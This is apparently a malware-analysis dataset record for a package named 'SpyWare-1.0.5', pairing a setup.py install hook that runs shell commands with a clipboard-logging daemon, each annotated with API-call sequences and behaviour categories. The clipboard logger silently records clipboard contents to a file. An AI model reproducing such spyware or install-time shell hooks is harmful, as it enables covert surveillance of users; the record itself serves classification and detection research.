[
  {
    "pyfile": "setup.py",
    "code_snippet": "from sys import maxsize, executable, version_info\nfrom setuptools.command.install import install\nfrom os import system as exec_command\nfrom platform import system\n\nclass PostInstallScript(install):\n    \"\"\"\n    This class install the PyAudio module.\n    \"\"\"\n\n    def is_64bit(self) -> bool:\n        \"\"\"\n        This function returns True if python is in x64 else returns False.\n        \"\"\"\n        return maxsize > 2 ** 32\n\n    def install_pyaudio(self):\n        \"\"\"\n        This function install the PyAudio module.\n        \"\"\"\n        if system() == \"Windows\":\n            v = f\"{version_info.major}{version_info.minor}\"\n            whl_file = (\n                f\"PyAudio-0.2.11-cp{v}-cp{v}-win_amd64.whl\"\n                if self.is_64bit()\n                else f\"PyAudio-0.2.11-cp{v}-cp{v}-win32.whl\"\n            )\n            exec_command(f'\"{executable}\" -m pip install \"{whl_file}\"')\n        else:\n            exec_command(\"sudo apt-get install portaudio19-dev python-pyaudio\")\n            packages.append(\"pyaudio\")\n\n    def run(self):\n        \"\"\"\n        Install the package.\n        \"\"\"\n        self.install_pyaudio()\n        install.run(self)\n",
    "pattern_analysis": {
      "api_sequence": [
        "platform.system",
        "sys.version_info.major",
        "sys.version_info.minor",
        "sys.maxsize",
        "os.system",
        "os.system",
        "setuptools.command.install.install.run"
      ],
      "api_sequence_with_args": [
        "platform.system()",
        "sys.version_info.major",
        "sys.version_info.minor",
        "sys.maxsize",
        "os.system(f'\"{sys.executable}\" -m pip install \"{whl_file}\"')",
        "os.system('sudo apt-get install portaudio19-dev python-pyaudio')",
        "setuptools.command.install.install.run(self)"
      ],
      "mapped_sequence": [
        {
          "api_name": "platform.system",
          "id": "get_os_id",
          "description": "Retrieves operating system identifier",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "os_information"
        },
        {
          "api_name": "sys.version_info.major",
          "id": "get_python_major",
          "description": "Retrieves major version of Python interpreter",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "sys.version_info.minor",
          "id": "get_python_minor",
          "description": "Retrieves minor version of Python interpreter",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "sys.maxsize",
          "id": "get_python_version",
          "description": "Retrieves Python interpreter version",
          "first_id": "information_gathering",
          "second_id": "system_information_collection",
          "third_id": "user_information"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "os.system",
          "id": "execute_shell_command",
          "description": "Executes shell command",
          "first_id": "command_control_communications",
          "second_id": "command_execution",
          "third_id": "command_sending"
        },
        {
          "api_name": "setuptools.command.install.install.run",
          "id": "exec_setuptools_install",
          "description": "Executes setuptools installation procedure",
          "first_id": "code_execution",
          "second_id": "module_management",
          "third_id": "package_configuration"
        }
      ],
      "contextual_code": "from sys import maxsize, executable, version_info\nfrom setuptools.command.install import install\nfrom os import system as exec_command\nfrom platform import system\n\nclass PostInstallScript(install):\n    def is_64bit(self) -> bool:\n        return maxsize > 2 ** 32\n\n    def install_pyaudio(self):\n        if system() == \"Windows\":\n            v = f\"{version_info.major}{version_info.minor}\"\n            whl_file = (\n                f\"PyAudio-0.2.11-cp{v}-cp{v}-win_amd64.whl\"\n                if self.is_64bit()\n                else f\"PyAudio-0.2.11-cp{v}-cp{v}-win32.whl\"\n            )\n            exec_command(f'\"{executable}\" -m pip install \"{whl_file}\"')\n        else:\n            exec_command(\"sudo apt-get install portaudio19-dev python-pyaudio\")\n            packages.append(\"pyaudio\")\n\n    def run(self):\n        self.install_pyaudio()\n        install.run(self)"
    }
  },
  {
    "pyfile": "ClipboardLogger.py",
    "code_snippet": "from pyperclip import paste\nfrom time import sleep\n\nclass Daemon:\n    \"\"\"\n    This class implements a loop to get clipboard for ever.\n    \"\"\"\n\n    def __init__(self):\n        self.internval = CONFIGURATIONS.internval\n        path = self.path = CONFIGURATIONS.save_filename\n        create_if_not_exists(path)\n        self.data_file = open(path)\n        self.data = \"\"\n        self.run = True\n\n    def run_for_ever(self) -> None:\n        \"\"\"\n        This function implements a loop to get clipboard for ever.\n        \"\"\"\n        persistent_save = self.persistent_save\n        internval = self.internval\n        save = self.save\n        counter = 0\n\n        while self.run:\n            clipboard = paste()\n            counter += 1\n\n            if len(clipboard) > 75:\n                clipboard = \"\"\n            else:\n                save(clipboard)\n\n            if counter >= 150:\n                persistent_save()\n                counter = 0\n\n            if self.run:\n                sleep(internval)\n\n    def save(self, clipboard: str) -> None:\n        \"\"\"\n        This function saves clipboard if isn't save before.\n        \"\"\"\n        clipboard = f\"{repr(clipboard)}\\n\"\n        data_file = self.data_file\n        data_file.seek(0)\n        readline = data_file.readline\n        data = readline()\n        if clipboard in self.data:\n            return None\n        while data:\n            if clipboard == data:\n                return None\n            data = readline()\n        self.data += clipboard\n\n    def persistent_save(self) -> None:\n        \"\"\"\n        This function saves data in file.\n        \"\"\"\n        path = self.path\n        self.data_file.close()\n        with open(path, \"a\") as file:\n            file.write(self.data)\n        self.data = \"\"\n        self.data_file = open(path)\n\ndef create_if_not_exists(filename: str) -> None:\n    \"\"\"\n    This function creates file if not exists.\n    \"\"\"\n    if not exists(filename):\n        file = open(filename, \"w\")\n        file.write(\"\")\n        file.close()\n\ndef main(config_filename: str = None, argv: List[str] = argv) -> int:\n    \"\"\"\n    This function starts the clipboard logger.\n    \"\"\"\n    config_load(filename=config_filename, argv=argv)\n    daemon = Daemon()\n    try:\n        daemon.run_for_ever()\n    except KeyboardInterrupt:\n        daemon.run = False\n    return 0\n\nif __name__ == \"__main__\":\n    print(copyright)\n    exit(main())",
    "pattern_analysis": {
      "api_sequence": [
        "pyperclip.paste",
        "open",
        "file.seek",
        "file.readline",
        "file.close",
        "open",
        "file.write",
        "open",
        "os.path.exists",
        "open",
        "file.write",
        "file.close",
        "config_load",
        "Daemon",
        "Daemon.run_for_ever",
        "time.sleep",
        "exit"
      ],
      "api_sequence_with_args": [
        "pyperclip.paste()",
        "open(path)",
        "file.seek(0)",
        "file.readline()",
        "file.close()",
        "open(path, \"a\")",
        "file.write(self.data)",
        "open(path)",
        "os.path.exists(filename)",
        "open(filename, \"w\")",
        "file.write(\"\")",
        "file.close()",
        "config_load(filename=config_filename, argv=argv)",
        "Daemon()",
        "Daemon.run_for_ever()",
        "time.sleep(internval)",
        "exit(main())"
      ],
      "mapped_sequence": [
        {
          "api_name": "pyperclip.paste",
          "id": "get_clipboard_text",
          "description": "Retrieves text from system clipboard",
          "first_id": "information_gathering",
          "second_id": "input_monitoring",
          "third_id": "clipboard_operations"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "file.seek",
          "id": "basic_file_reading",
          "description": "Reading content from files (by lines or entire content)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_reading"
        },
        {
          "api_name": "file.readline",
          "id": "basic_file_reading",
          "description": "Reading content from files (by lines or entire content)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_reading"
        },
        {
          "api_name": "file.close",
          "id": "close_file",
          "description": "Closes the opened file",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_closing"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "file.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "open",
          "id": "basic_read_operations",
          "description": "ic file opening operations for reading (normal reading, binary reading)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "os.path.exists",
          "id": "check_path_exists",
          "description": "Checks if specified path exists in filesystem",
          "first_id": "file_operations",
          "second_id": "file_management",
          "third_id": "file_checking"
        },
        {
          "api_name": "open",
          "id": "basic_write_operations",
          "description": "Basic file opening operations for writing (normal writing, binary writing)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_opening"
        },
        {
          "api_name": "file.write",
          "id": "basic_file_writing",
          "description": "Writing data to files (strings or bytes)",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_writing"
        },
        {
          "api_name": "file.close",
          "id": "close_file",
          "description": "Closes the opened file",
          "first_id": "file_operations",
          "second_id": "file_reading_writing",
          "third_id": "file_closing"
        },
        {
          "api_name": "config_load",
          "id": "init_config_class",
          "description": "Initializes Config class with provided arguments",
          "first_id": "code_execution",
          "second_id": "object_initialization",
          "third_id": "class_initialization"
        },
        {
          "api_name": "Daemon",
          "id": "init_parent_class",
          "description": "Initializes parent class with provided arguments",
          "first_id": "code_execution",
          "second_id": "object_initialization",
          "third_id": "class_initialization"
        },
        {
          "api_name": "Daemon.run_for_ever",
          "id": "start_thread",
          "description": "Starts thread execution",
          "first_id": "system_operations",
          "second_id": "thread_management",
          "third_id": "thread_control"
        },
        {
          "api_name": "time.sleep",
          "id": "suspend_execution",
          "description": "Suspends execution for specified seconds",
          "first_id": "system_operations",
          "second_id": "system_environment_operations",
          "third_id": "time_operations"
        },
        {
          "api_name": "exit",
          "id": "exit_program",
          "description": "Exits program with specified status code",
          "first_id": "system_operations",
          "second_id": "process_management",
          "third_id": "process_control"
        }
      ],
      "contextual_code": "from pyperclip import paste\nfrom time import sleep\nimport os\n\ndef create_if_not_exists(filename: str) -> None:\n    if not os.path.exists(filename):\n        file = open(filename, \"w\")\n        file.write(\"\")\n        file.close()\n\nclass Daemon:\n    def __init__(self):\n        self.internval = CONFIGURATIONS.internval\n        path = self.path = CONFIGURATIONS.save_filename\n        create_if_not_exists(path)\n        self.data_file = open(path)\n        self.data = \"\"\n        self.run = True\n\n    def run_for_ever(self) -> None:\n        persistent_save = self.persistent_save\n        internval = self.internval\n        save = self.save\n        counter = 0\n        while self.run:\n            clipboard = paste()\n            counter += 1\n            if len(clipboard) > 75:\n                clipboard = \"\"\n            else:\n                save(clipboard)\n            if counter >= 150:\n                persistent_save()\n                counter = 0\n            if self.run:\n                sleep(internval)\n\n    def save(self, clipboard: str) -> None:\n        clipboard = f\"{repr(clipboard)}\\n\"\n        data_file = self.data_file\n        data_file.seek(0)\n        readline = data_file.readline\n        data = readline()\n        if clipboard in self.data:\n            return None\n        while data:\n            if clipboard == data:\n                return None\n            data = readline()\n        self.data += clipboard\n\n    def persistent_save(self) -> None:\n        path = self.path\n        self.data_file.close()\n        with open(path, \"a\") as file:\n            file.write(self.data)\n        self.data = \"\"\n        self.data_file = open(path)\n"
    }
  },
  {
    "metadata": {
      "package_name": "SpyWare-1.0.5"
    }
  }
]